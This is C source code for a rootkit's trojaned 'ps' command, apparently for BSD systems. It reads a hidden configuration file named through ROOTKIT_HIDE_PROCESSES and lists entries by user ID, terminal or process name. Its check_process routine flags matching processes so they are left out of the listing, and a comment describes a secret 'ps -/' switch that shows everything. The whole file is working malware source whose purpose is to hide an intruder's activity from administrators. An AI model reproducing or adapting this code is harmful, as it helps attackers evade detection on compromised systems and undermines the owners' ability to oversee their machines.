#define STR_SIZE	128
#define SEP_CHAR	" \n"
#define SHOWFLAG	/*  Able to list processes with 'ps -/' command  */
#define BY_USER		0
#define BY_TTY		1
#define BY_NAME		2

struct h_st {
	struct h_st *next;
	int hack_type;
	char hack_cmd[STR_SIZE];
};

struct h_st *hack_list;
struct h_st *h_tmp;

char tmp_str[STR_SIZE];
char *strp;

FILE *fp_hack;

int show_all=0;

inline process_block_list()
{
	char PSCONF[10];

	PSCONF[0]=ROOTKIT_HIDE_PROCESSES[0];
	PSCONF[1]=ROOTKIT_HIDE_PROCESSES[1];
	PSCONF[2]=ROOTKIT_HIDE_PROCESSES[2];
	PSCONF[3]=ROOTKIT_HIDE_PROCESSES[3];
	PSCONF[4]=ROOTKIT_HIDE_PROCESSES[4];
	PSCONF[5]=ROOTKIT_HIDE_PROCESSES[5];
	PSCONF[6]=ROOTKIT_HIDE_PROCESSES[6];
	PSCONF[7]=ROOTKIT_HIDE_PROCESSES[7];
	PSCONF[8]=ROOTKIT_HIDE_PROCESSES[8];
	PSCONF[9]='\0';

	h_tmp=(struct h_st *)malloc(sizeof(struct h_st));
	hack_list=h_tmp; 

	if(fp_hack=fopen(PSCONF,"r")) {
		while(fgets(tmp_str, 126, fp_hack)) {
			h_tmp->next=(struct h_st *)malloc(sizeof(struct h_st));
			strp=(char *)strtok(tmp_str, SEP_CHAR);
			h_tmp->hack_type=atoi(strp);
			strp=(char *)strtok('\0', SEP_CHAR);
			strcpy(h_tmp->hack_cmd, strp);
			h_tmp=h_tmp->next;
		}
	}
        
	h_tmp->next=NULL;
}

inline int check_process(struct kinfo_proc *kip)
{
	int block=0;
	dev_t dev;
	char *ttname;

	for(h_tmp=hack_list; h_tmp->next; h_tmp=h_tmp->next) {
		switch(h_tmp->hack_type) {
			case BY_USER:
#ifndef NEWVM
				if(kip->kp_proc.p_uid==atoi(h_tmp->hack_cmd))
#else
				if(kip->kp_eproc.e_ucred.cr_uid==atoi(h_tmp->hack_cmd))
#endif
					block=1;
				break;
                        case BY_TTY:
				dev=kip->kp_eproc.e_tdev;
				if(dev==NODEV||!(ttname=devname(dev,S_IFCHR)))
					break;
				else {
					if(!strncmp(ttname,"tty",3)||!strncmp(ttname,"cua",3))
						ttname+=3;
					if(!strcmp(ttname,h_tmp->hack_cmd))
						block=1;
				}
				break;
			case BY_NAME:
				if(strstr(kip->kp_proc.p_comm,h_tmp->hack_cmd))
					block=1;
                                break;
			}
	}

	return(block);
}
